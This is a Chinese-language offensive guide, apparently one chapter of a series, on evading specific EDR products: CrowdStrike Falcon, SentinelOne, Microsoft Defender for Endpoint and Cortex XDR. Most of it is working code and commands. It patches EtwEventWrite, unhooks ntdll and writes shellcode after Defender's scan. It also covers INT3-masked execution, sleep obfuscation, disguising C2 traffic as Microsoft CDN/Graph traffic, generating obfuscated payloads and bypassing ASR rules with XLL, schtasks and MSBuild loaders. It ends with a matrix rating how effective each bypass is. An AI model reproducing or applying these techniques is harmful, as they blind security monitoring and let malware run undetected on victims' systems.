# 15 - EDR深度对抗

> CrowdStrike Falcon / SentinelOne / Cortex XDR / MDE 专属绕过技术

## 一、CrowdStrike Falcon 深度对抗

### 1.1 Falcon检测架构
```
Falcon Sensor (用户态) 
  ├── 用户态Hook (ntdll/kernel32/kernelbase)
  ├── 调用栈完整性检查 (核心检测手段)
  ├── 行为模式匹配 (IOA - Indicators of Attack)
  └── 内存扫描（定期+事件触发）

Falcon OverWatch (云端)
  ├── ML行为分析
  ├── 攻击链重建
  └── 威胁狩猎
```

### 1.2 核心绕过：完整调用栈欺骗
```cpp
// Falcon 最关注的是调用栈的完整性
// 如果调用栈中出现"未知"或"可疑"区域 → 报警

// 方案A: SilentMoonwalk Desync模式
SMW::SpoofedCall(
    "NtAllocateVirtualMemory",
    // 调用栈会显示: ntdll!syscall → kernel
    // 完全隐藏调用者
);

// 方案B: 完整ROP链欺骗
// 构造: shell32.dll → kernel32.dll → kernelbase.dll → ntdll.dll
// 步骤:
// 1. 保存原始栈
// 2. 构造合成帧链
// 3. 每个帧指向合法DLL的返回地址
// 4. 执行syscall
// 5. 恢复原始栈
```

### 1.3 Falcon Blind Spot（盲区）
```cpp
// 1. 非Hook敏感的API
// Falcon 不Hook所有API，某些非核心API可绕过
NtCreateUserProcess  // 可能未Hook
NtCreateThreadEx     // Hook但可以通过HWBP绕过

// 2. COM对象执行
// 通过COM接口执行操作，Falcon难以追踪COM调用链
CoCreateInstance(CLSID_MMCApplication, ...);
IMMCApplication->ExecuteShellCommand(...);

// 3. WMI间接执行
// WMI以独立的wmiprvse.exe进程运行
// Falcon对WMI提供程序的内部执行链监控较弱
```

### 1.4 Falcon Network Detection 绕过
```cpp
// Falcon 网络检测重点关注:
// - 非标准协议
// - 与已知恶意IP通信

// 绕过方法:
// 1. HTTPS + Microsoft CDN域名
// 2. 证书固定 + 合法CA签发
// 3. SNI伪装 (伪装为 graph.microsoft.com)

// 流量伪装模板（Go）
client := &http.Client{
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{
            ServerName: "graph.microsoft.com", // SNI伪装
        },
    },
}
client.Get("https://cdn.azureedge.net/update/check") // CDN前置
```

---

## 二、SentinelOne (S1) 深度对抗

### 2.1 S1检测架构
```
Static AI Engine (静态分析)
  ├── PE结构特征提取
  ├── 导入表分析
  ├── 字符串分析
  └── 熵值分析

Storyline Engine (行为关联)
  ├── 进程链追踪
  ├── 文件/注册表/网络操作关联
  └── 攻击链重建

Deep Visibility (深度可见性)
  ├── ETW事件收集
  ├── 进程事件追踪
  └── 内核级事件 (已移除用户态Hook!)
```

### 2.2 S1 Static AI 绕过（最关键！）
```bash
# S1 Static AI的核心弱点：训练数据偏向VC++/MinGW

# 方法1: Go编译 (推荐)
CGO_ENABLED=0 GOOS=windows garble -tiny -literals build \
  -ldflags="-s -w -H=windowsgui" -gcflags="-N -l" -o payload.exe

# 方法2: Rust编译
cargo build --release --target x86_64-pc-windows-msvc
# Rust生成的PE结构与C/C++显著不同

# 方法3: Nim编译
nim c -d:danger -d:strip --opt:size --passL:-s loader.nim

# 方法4: Zig编译（编译时计算）
zig build-exe loader.zig -target x86_64-windows -OReleaseSmall

# 方法5: 每次重新编译（关键！）
# S1 Static AI的弱点：对"每次不同的二进制"检测能力低
# 每次编译 → 不同的hash → 不同的PE特征 → AI评分低
for i in {1..10}; do
    garble -seed=random build -ldflags="-s -w -H=windowsgui" -o "payload_${i}.exe"
    # 每个文件都不同！
done
```

### 2.3 S1 Storyline 断裂技术
```cpp
// Storyline通过进程链关联行为
// 打破进程链 = 中断行为关联

// 方法1: 多进程分段操作
// 进程A: 下载 + 写入文件
// 进程B: 解密文件 + 注入
// 进程C: 执行shellcode
// S1看到3个独立进程，难以关联

// 方法2: WMI隔离
// 通过WMI在wmiprvse.exe上下文中执行
// S1的Storyline引擎对WMI子进程关联弱

// 方法3: 时间分割
// 将操作分散在多个时间窗口
// Phase 1: T+0min → 落地
// Phase 2: T+15min → 解密
// Phase 3: T+30min → 注入
// S1 Storyline窗口无法跨越30分钟
```

### 2.4 S1 Deep Visibility 对抗
```bash
# S1已经移除用户态Hook！这意味着：
# 1. 间接syscall不是S1的核心绕过点
# 2. S1依赖ETW收集事件

# 攻击向量：阻断ETW
# 方法1: ETW Provider 卸载
logman stop "S1-Provider" -ets

# 方法2: EtwEventWrite Patch
# 在运行时patch ntdll!EtwEventWrite为ret

# 方法3: 减少可检测行为
# - 避免敏感API组合
# - 使用非标准API路径
# - 模块践踏隐藏恶意DLL
```

---

## 三、Microsoft Defender for Endpoint (MDE) 深度对抗

### 3.1 MDE检测架构
```
MDE组件:
├── MsMpEng.exe (核心引擎)
│   ├── AMSI集成
│   ├── 行为监控
│   └── 内存扫描
├── SenseCncProxy.exe (云端通信)
├── SenseIR.exe (自动调查)
└── ASR规则 (攻击面减少)
```

### 3.2 MDE内存扫描绕过（NullGate + Voidmaw）

**NullGate — NtCreateThreadEx扫描时序绕过**
```cpp
// Defender在NtCreateThreadEx后立即扫描附近30KB
// NullGate利用扫描时序

// Step 1: 分配32KB NO_ACCESS空间
NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &size32k,
    MEM_COMMIT | MEM_RESERVE, PAGE_NOACCESS);
// Defender扫描NO_ACCESS → 无异常

// Step 2: 修改为RW，写入垃圾数据
NtProtectVirtualMemory(GetCurrentProcess(), &addr, &size32k, PAGE_READWRITE, &old);
memset(addr, 0xCC, size32k); // junk data

// Step 3: 修改为RX
NtProtectVirtualMemory(GetCurrentProcess(), &addr, &size32k, PAGE_EXECUTE_READ, &old);
// Defender扫描RX区域 → 全是0xCC → 无异常

// Step 4: 创建挂起线程
NtCreateThreadEx(&hThread, ..., addr, ..., CREATE_SUSPENDED, ...);
// Defender在CreateThread后进行扫描 → 看不到shellcode

// Step 5: 写入真实shellcode（扫描已过）
NtWriteVirtualMemory(GetCurrentProcess(), addr, realShellcode, scSize, NULL);
NtResumeThread(hThread, NULL);
// ✅ 绕过MDE内存扫描
```

**Voidmaw — INT3屏蔽执行**
```cpp
// 每次只有1条指令可见
// RtlAddVectoredExceptionHandler设置VEH

// 初始化：shellocde每条指令前插入INT3
for (int i = 0; i < scSize; i++) {
    sc_obfuscated[i*2] = 0xCC;       // INT3
    sc_obfuscated[i*2+1] = sc[i];   // 真实指令
}

// VEH处理程序：
LONG WINAPI VoidmawHandler(PEXCEPTION_POINTERS ex) {
    // 1. 解密下一条指令 (DR0指向当前位置)
    // 2. 加密当前指令为INT3
    // 3. 单步执行
    // 4. 循环...
}
// 内存扫描器只能看到INT3 → 无法分析
```

### 3.3 ASR规则绕过
```powershell
# ASR (Attack Surface Reduction) 常见规则及绕过

# 规则: 阻止Office创建子进程
# 绕过: 使用COM对象而非CreateProcess
$excel = New-Object -ComObject Excel.Application
$excel.RegisterXLL("malicious.xll")  # DLL执行而非子进程

# 规则: 阻止从Office/WMI的进程创建
# 绕过: 使用计划任务延迟执行
schtasks /create /tn "update" /tr "payload" /sc once /st 00:01 /f

# 规则: 阻止不可信/未签名的可执行文件
# 绕过: LOLBins
msbuild.exe inline_task.xml
```

---

## 四、Palo Alto Cortex XDR 深度对抗

### 4.1 Cortex检测盲区
```
Cortex关键弱点:
├── 对Go/Rust/Nim编译产物检测弱（训练数据以C/C++为主）
├── WildFire云分析有上传大小限制和时间窗口
├── 对LOLBin链式调用的进程关联弱
└── 对间接syscall的检测不如CrowdStrike
```

### 4.2 Cortex绕过实战
```bash
# 1. 使用MSBuild作为初始执行器
# 2. MSBuild内嵌C# → 间接syscall加载shellcode
# 3. 注入到dllhost.exe（Cortex信任的COM代理进程）
# 4. C2流量走HTTPS + Azure CDN

# MSBuild XML (内嵌C#)
<Project>
  <Target Name="Build">
    <InlineTask />
  </Target>
  <UsingTask TaskName="InlineTask" ...>
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        // C# D/Invoke + Indirect Syscall Loader
        // 加载加密shellcode → 解密 → 注入dllhost.exe
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

---

## 五、EDR通用绕过技术总结

### 5.1 ETW全面阻断
```cpp
// 方法1: Patch EtwEventWrite (最常用)
void PatchETW() {
    HMODULE ntdll = GetModuleHandle("ntdll.dll");
    PVOID etw = GetProcAddress(ntdll, "EtwEventWrite");
    
    DWORD oldProtect;
    VirtualProtect(etw, 3, PAGE_EXECUTE_READWRITE, &oldProtect);
    // xor eax, eax; ret = 0x31, 0xC0, 0xC3
    memcpy(etw, "\x31\xC0\xC3", 3);
    VirtualProtect(etw, 3, oldProtect, &oldProtect);
}

// 方法2: NTDLL脱钩后Patch（KHAOS-LOADER方法）
void PatchETW_NTDLL_Unhook() {
    // 1. 从磁盘读取干净ntdll.dll
    HANDLE hFile = CreateFile("C:\\Windows\\System32\\ntdll.dll", ...);
    HANDLE hSection;
    NtCreateSection(&hSection, ..., hFile, ...);
    PVOID cleanNtdll;
    NtMapViewOfSection(hSection, GetCurrentProcess(), &cleanNtdll, ...);
    
    // 2. 提取干净.text段
    // 3. 覆盖内存中被Hook的.text段
    // 4. 在干净ntdll中patch EtwEventWrite
}
```

### 5.2 Sleep混淆（Cronos方法）
```cpp
// Cronos: github.com/Idov31/Cronos ⭐624
// 使用可等待定时器在Sleep期间混淆内存

void ObfuscatedSleep(DWORD milliseconds) {
    // 1. 加密当前堆区
    XOREncrypt(heapStart, heapSize, randomKey);
    
    // 2. 创建可等待定时器
    HANDLE hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
    
    // 3. 设置定时器（时间 = Sleep时间）
    LARGE_INTEGER liDueTime;
    liDueTime.QuadPart = -10000LL * milliseconds;
    SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, FALSE);
    
    // 4. 等待定时器（EDR扫描时内存是加密的）
    WaitForSingleObject(hTimer, INFINITE);
    
    // 5. 解密堆区
    XORDecrypt(heapStart, heapSize, randomKey);
    SecureZeroMemory(&randomKey, sizeof(randomKey));
    
    CloseHandle(hTimer);
}
```

### 5.3 自适应Sleep（Jitter + 垃圾API）
```cpp
void AdaptiveSleep() {
    // 随机Jitter
    DWORD sleepTime = (rand() % 10000) + 5000;
    
    // 插入垃圾API调用（扰乱行为分析）
    for (int i = 0; i < rand() % 50; i++) {
        GetSystemInfo(&si);          // 无害调用
        GetTickCount();
        IsDebuggerPresent();
        SetErrorMode(0);
    }
    
    // 非标准Sleep
    LARGE_INTEGER li;
    li.QuadPart = -10000LL * sleepTime;
    NtDelayExecution(FALSE, &li);  // 用NT API代替Sleep
}
```

---

## 六、EDR对抗检测效果矩阵

| 技术 | CrowdStrike | SentinelOne | MDE | Cortex XDR | 360核晶 |
|------|------------|-------------|-----|------------|--------|
| 间接syscall | ✅ | N/A(无Hook) | ✅ | ✅ | ✅ |
| SilentMoonwalk | ✅✅ | ✅ | ✅✅ | ✅ | ✅ |
| HWBP Unhooking | ✅✅ | ✅ | ✅✅ | ✅ | ⚠️ |
| PoolParty | ✅ | ✅ | ✅ | ✅ | ✅✅ |
| Module Stomping | ⚠️ | ✅ | ⚠️ | ✅ | ✅ |
| ETW阻断 | ✅ | ✅✅ | ✅ | ✅ | ✅ |
| Sleep混淆 | ✅✅ | ✅ | ✅✅ | ✅ | ✅ |
| Go/Rust编译 | ✅ | ✅✅✅ | ✅ | ✅ | ✅✅✅ |

✅ = 有效  ✅✅ = 高度有效  ✅✅✅ = 最佳绕过  ⚠️ = 部分有效  N/A = 不适用

> EDR对抗的核心哲学：**知道EDR在看什么 → 不让他们看到**
